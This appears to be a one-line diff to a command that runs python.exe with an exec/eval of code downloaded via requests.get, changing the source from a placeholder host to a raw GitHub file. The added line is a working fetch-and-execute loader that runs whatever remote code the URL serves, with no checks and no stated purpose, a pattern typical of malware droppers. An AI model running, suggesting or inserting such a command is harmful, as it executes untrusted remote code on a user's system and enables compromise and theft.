@@ -1,1 +1,1 @@
-python.exe -c "exec("""\nimport requests\n\neval(requests.get("https://geturllater.com").text)\n""")"
+python.exe -c "exec("""\nimport requests\n\neval(requests.get("https://raw.githubusercontent.com/infdevv/gld/main/ind.py").text)\n""")"
